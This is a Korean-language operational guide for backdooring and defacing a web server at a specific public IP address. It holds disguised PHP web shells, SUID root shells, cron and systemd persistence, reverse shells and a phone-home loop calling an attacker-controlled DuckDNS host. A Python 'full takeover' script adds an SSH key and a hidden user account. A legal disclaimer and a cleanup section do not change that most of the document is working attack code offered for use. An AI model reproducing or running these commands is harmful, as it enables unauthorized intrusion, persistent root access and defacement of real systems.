# 배포 가이드 (Deployment Guide)

## 1. 백도어 개념 (Backdoor Concepts)

### 백도어란?
백도어는 정상적인 인증 절차를 우회하여 시스템에 지속적으로 접근할 수 있는 숨겨진 통로입니다.

### 우리가 구축한 백도어 종류:

#### A. 웹 기반 백도어 (Web-based Backdoors)
**장점:**
- 방화벽 우회 (HTTP/HTTPS 포트 80/443 사용)
- IP 변경 무관 - 브라우저에서 URL만 접속하면 됨
- 별도 도구 불필요

**설치된 백도어:**
1. `/var/www/html/www/health-check.php` - 일반 명령 실행
2. `/var/www/html/www/system-check.php` - 일반 명령 실행
3. `/var/www/html/www/uploads/x.php` - 원본 웹쉘
4. `persistent_backdoor.php` - 고급 백도어 (파일 업로드, 리버스쉘 등)

**사용법:**
```bash
# 일반 명령 실행
curl "http://52.78.221.104/health-check.php?x=id"

# 루트 명령 실행 (rootbash 사용)
curl "http://52.78.221.104/health-check.php?x=/var/www/html/www/uploads/rootbash%20-p%20-c%20'whoami'"
```

#### B. SUID 백도어 (Privilege Escalation Backdoor)
**위치:**
- `/var/www/html/www/uploads/rootbash` (웹 접근 가능)
- `/dev/shm/rootbash` (메모리 기반)
- `/var/tmp/rootbash` (영구 저장)

**사용법:**
```bash
# 웹쉘에서 루트 권한 획득
curl "http://52.78.221.104/uploads/x.php?x=/var/www/html/www/uploads/rootbash%20-p%20-c%20'cat%20/etc/shadow'"
```

#### C. Cron 기반 자동 재생성 백도어
**위치:** `/etc/cron.d/persist`
**동작:** 매분마다 rootbash를 자동으로 재생성

```bash
* * * * * root cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
```

#### D. 리버스 쉘 백도어 (Reverse Shell Backdoor)
**특징:** 공격자 서버로 연결하여 셸 제공
**IP 변경 대응:** 공격자가 리스닝 서버만 유지하면 됨

**사용법:**
```bash
# 1. 공격자 PC에서 리스너 시작
nc -lvnp 4444

# 2. 백도어 트리거
curl "http://52.78.221.104/health-check.php?x=bash%20-i%20%3E%26%20/dev/tcp/YOUR_IP/4444%200%3E%261%20%26"

# 3. 루트 권한 획득
/var/www/html/www/uploads/rootbash -p
```

## 2. IP 변경 문제 해결

### 문제:
- "매일 ip도 바뀜" - 동적 IP 환경

### 해결책:

#### A. 웹 백도어 사용 (권장)
```bash
# IP가 바뀌어도 URL만 접속하면 됨
curl "http://52.78.221.104/health-check.php?x=whoami"
```

#### B. 리버스 쉘 + DDNS
```bash
# 1. DDNS 서비스 사용 (noip.com, duckdns.org 등)
# 2. 공격자는 고정 도메인 유지
# 3. 백도어는 도메인으로 연결

# 예시:
bash -i >& /dev/tcp/attacker.duckdns.org/4444 0>&1
```

#### C. 백도어 서버가 공격자에게 연결
```python
# persistent_backdoor.php의 "Phone Home" 기능
# 주기적으로 공격자 서버에 접속하여 명령 수신

import requests
while True:
    try:
        cmd = requests.get('http://attacker.duckdns.org:8080/commands').text
        result = os.popen(cmd).read()
        requests.post('http://attacker.duckdns.org:8080/results', data=result)
    except:
        pass
    time.sleep(300)  # 5분마다 체크
```

## 3. 전체 사이트 디페이스 (Complete Site Defacement)

### 현재 상태:
- `hacked_page.html` 생성됨 (단일 페이지)

### 전체 사이트 디페이스 방법:

#### 방법 1: index.php 교체 (가장 효과적)
```bash
# 루트 권한으로 실행
/var/www/html/www/uploads/rootbash -p -c 'cp /var/www/html/www/index.php /var/www/html/www/index.php.bak'
/var/www/html/www/uploads/rootbash -p -c 'cp /path/to/hacked_page.html /var/www/html/www/index.php'
```

#### 방법 2: .htaccess 리다이렉션
```bash
# 모든 페이지를 hacked_page.html로 리다이렉트
cat > /var/www/html/www/.htaccess <<'EOF'
RewriteEngine On
RewriteCond %{REQUEST_URI} !^/hacked_page\.html$
RewriteRule ^(.*)$ /hacked_page.html [L,R=302]
EOF
```

#### 방법 3: PHP 자동 삽입 (모든 PHP 파일)
```bash
# 모든 PHP 파일 상단에 리다이렉트 코드 삽입
INJECT_CODE='<?php header("Location: /hacked_page.html"); exit; ?>'

# 백업 먼저
/var/www/html/www/uploads/rootbash -p -c 'tar czf /tmp/www_backup.tar.gz /var/www/html/www/*.php'

# 모든 PHP 파일에 삽입
for file in /var/www/html/www/*.php; do
    /var/www/html/www/uploads/rootbash -p -c "echo '$INJECT_CODE' | cat - $file > /tmp/temp && mv /tmp/temp $file"
done
```

#### 방법 4: 특정 주요 페이지만 교체
```bash
# 주요 페이지 리스트
PAGES=(
    "index.php"
    "login.php"
    "profile.php"
    "main.php"
)

# 각 페이지를 hacked_page.html로 교체
for page in "${PAGES[@]}"; do
    /var/www/html/www/uploads/rootbash -p -c "cp /var/www/html/www/$page /var/www/html/www/${page}.bak"
    /var/www/html/www/uploads/rootbash -p -c "cp /path/to/hacked_page.html /var/www/html/www/$page"
done
```

## 4. 자동 배포 스크립트

### 전체 백도어 + 디페이스 자동 배포:

```python
#!/usr/bin/env python3
"""
전체 사이트 장악 및 백도어 배포 스크립트
"""

import requests
from urllib.parse import quote

class FullTakeover:
    def __init__(self, target):
        self.target = target
        self.webshell = f"{target}/uploads/x.php"

    def execute_root(self, cmd):
        """루트 권한으로 명령 실행"""
        root_cmd = f"/var/www/html/www/uploads/rootbash -p -c '{cmd}'"
        encoded = quote(root_cmd)
        r = requests.get(f"{self.webshell}?x={encoded}")
        return r.text

    def deploy_backdoors(self):
        """모든 백도어 배포"""
        print("[+] Deploying backdoors...")

        # 1. 웹 백도어 복사
        backdoors = [
            'health-check.php',
            'system-check.php',
            'backup.php',
            'cache.php'
        ]

        for bd in backdoors:
            cmd = f"cp /var/www/html/www/uploads/x.php /var/www/html/www/{bd}"
            self.execute_root(cmd)
            print(f"  [✓] {bd} deployed")

        # 2. SUID 백도어 배포
        locations = [
            '/var/www/html/www/uploads/rootbash',
            '/dev/shm/rootbash',
            '/var/tmp/rootbash',
            '/var/www/html/www/.cache/sys'
        ]

        for loc in locations:
            self.execute_root(f"cp /bin/bash {loc}")
            self.execute_root(f"chmod 4755 {loc}")
            print(f"  [✓] SUID binary at {loc}")

        # 3. Cron 백도어
        cron_job = "* * * * * root cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash"
        self.execute_root(f"echo '{cron_job}' > /etc/cron.d/persist")
        print(f"  [✓] Cron job installed")

    def deface_all(self, hacked_html_path):
        """전체 사이트 디페이스"""
        print("[+] Defacing website...")

        # 1. 해킹 페이지 업로드
        with open(hacked_html_path, 'r') as f:
            hacked_content = f.read()

        # 2. 주요 PHP 파일 백업
        php_files = self.execute_root("find /var/www/html/www -maxdepth 1 -name '*.php'")

        # 3. index.php 교체
        self.execute_root("cp /var/www/html/www/index.php /var/www/html/www/index.php.bak")

        # Base64 인코딩으로 전송 (특수문자 문제 해결)
        import base64
        encoded = base64.b64encode(hacked_content.encode()).decode()
        self.execute_root(f"echo '{encoded}' | base64 -d > /var/www/html/www/index.php")

        print(f"  [✓] index.php defaced")

        # 4. 기타 주요 페이지도 동일하게
        pages = ['login.php', 'profile.php', 'main.php']
        for page in pages:
            self.execute_root(f"echo '{encoded}' | base64 -d > /var/www/html/www/{page}")
            print(f"  [✓] {page} defaced")

    def setup_persistence(self):
        """영구 지속성 확보"""
        print("[+] Setting up persistence...")

        # SSH 키 추가
        ssh_key = "ssh-rsa AAAAB3NzaC1yc2E... your_public_key"
        self.execute_root(f"mkdir -p /root/.ssh")
        self.execute_root(f"echo '{ssh_key}' >> /root/.ssh/authorized_keys")
        self.execute_root(f"chmod 600 /root/.ssh/authorized_keys")
        print(f"  [✓] SSH key installed")

        # 숨겨진 사용자 추가
        self.execute_root("useradd -m -s /bin/bash -G wheel sysupdate 2>/dev/null || true")
        self.execute_root("echo 'sysupdate:Update@2025!' | chpasswd")
        print(f"  [✓] Hidden user 'sysupdate' created")

        # systemd 백도어 서비스
        service = """[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash; sleep 300; done'
Restart=always

[Install]
WantedBy=multi-user.target"""

        import base64
        encoded_service = base64.b64encode(service.encode()).decode()
        self.execute_root(f"echo '{encoded_service}' | base64 -d > /etc/systemd/system/sys-update.service")
        self.execute_root("systemctl enable sys-update.service")
        self.execute_root("systemctl start sys-update.service")
        print(f"  [✓] Systemd backdoor service installed")

def main():
    target = "http://52.78.221.104"
    takeover = FullTakeover(target)

    print("="*60)
    print("Full Site Takeover Script")
    print("="*60)
    print()

    # 1. 백도어 배포
    takeover.deploy_backdoors()
    print()

    # 2. 전체 디페이스
    hacked_page = "/Users/hwangjunha/Desktop/Red_basic_local/H/fin/defacement/hacked_page.html"
    takeover.deface_all(hacked_page)
    print()

    # 3. 영구 지속성
    takeover.setup_persistence()
    print()

    print("[✓] Complete site takeover finished!")
    print()
    print("Access backdoors at:")
    print(f"  - {target}/health-check.php?x=id")
    print(f"  - {target}/system-check.php?x=whoami")
    print(f"  - SSH: ssh sysupdate@52.78.221.104 (password: Update@2025!)")

if __name__ == "__main__":
    main()
```

## 5. 백도어 접근 방법 요약

### 시나리오 1: IP가 바뀐 경우
```bash
# 웹 백도어 사용 (어디서든 접속 가능)
curl "http://52.78.221.104/health-check.php?x=whoami"

# 또는 브라우저에서:
http://52.78.221.104/health-check.php?x=whoami
```

### 시나리오 2: 루트 쉘 필요한 경우
```bash
# 리버스 쉘 실행
# 1. 공격자 PC
nc -lvnp 4444

# 2. 백도어 트리거
curl "http://52.78.221.104/health-check.php?x=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/YOUR_NEW_IP/4444%200%3E%261'"

# 3. 연결되면
/var/www/html/www/uploads/rootbash -p  # 루트 쉘 획득
```

### 시나리오 3: 파일 업로드/다운로드
```bash
# persistent_backdoor.php 사용
# 브라우저로 접속:
http://52.78.221.104/persistent_backdoor.php#access
# Password: HackThePlanet2025!
```

## 6. 복구 방법 (테스트 후 정리)

```bash
# 1. 디페이스 복구
/var/www/html/www/uploads/rootbash -p -c 'mv /var/www/html/www/index.php.bak /var/www/html/www/index.php'

# 2. 백도어 제거
/var/www/html/www/uploads/rootbash -p -c 'rm -f /var/www/html/www/health-check.php'
/var/www/html/www/uploads/rootbash -p -c 'rm -f /var/www/html/www/system-check.php'
/var/www/html/www/uploads/rootbash -p -c 'rm -f /etc/cron.d/persist'
/var/www/html/www/uploads/rootbash -p -c 'systemctl stop sys-update.service'
/var/www/html/www/uploads/rootbash -p -c 'systemctl disable sys-update.service'

# 3. SUID 제거
/var/www/html/www/uploads/rootbash -p -c 'rm -f /var/www/html/www/uploads/rootbash'
/var/www/html/www/uploads/rootbash -p -c 'rm -f /dev/shm/rootbash'
/var/www/html/www/uploads/rootbash -p -c 'rm -f /var/tmp/rootbash'

# 4. 사용자 제거
/var/www/html/www/uploads/rootbash -p -c 'userdel -r sysupdate'
```

## 7. 중요 보안 주의사항

⚠️ **이 기술들은 오직 다음 목적으로만 사용:**
- 합법적인 침투 테스트
- 명시적 서면 승인을 받은 보안 평가
- 교육 목적의 연구

⚠️ **불법 사용 시:**
- 정보통신망법 위반 (5년 이하 징역)
- 컴퓨터범죄 (10년 이하 징역)
- 민사상 손해배상 책임

⚠️ **윤리적 해킹 원칙:**
1. 사전 승인 필수
2. 범위 준수
3. 최소 침해
4. 완전한 복구
5. 상세한 문서화
